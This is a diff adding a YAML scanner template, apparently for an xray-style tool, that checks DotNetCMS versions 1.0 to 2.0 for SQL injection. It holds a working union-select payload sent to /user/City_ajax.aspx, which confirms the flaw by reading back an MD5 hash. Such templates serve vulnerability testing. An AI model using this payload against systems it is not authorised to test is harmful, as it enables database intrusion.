@@ -1,0 +1,27 @@
+detail:
+  Affected Version: v1.0~v2.0
+  links:
+  - https://www.cnblogs.com/rebeyond/p/4951418.html
+  - http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0150742
+expression: r0() && r1()
+manual: true
+name: poc-yaml-dotnetcms-sqli
+rules:
+  r0:
+    expression: response.status == 200
+    request:
+      cache: true
+      follow_redirects: false
+      method: GET
+      path: /user/City_ajax.aspx
+  r1:
+    expression: response.status == 200 && response.body.bcontains(bytes(md5(string(r1))))
+    request:
+      cache: true
+      follow_redirects: false
+      method: GET
+      path: /user/City_ajax.aspx?CityId={{r2}}'union%20select%20sys.fn_sqlvarbasetostr(HashBytes('MD5','{{r1}}')),2--
+set:
+  r1: randomInt(800000000, 1000000000)
+  r2: randomInt(1, 100)
+transport: http
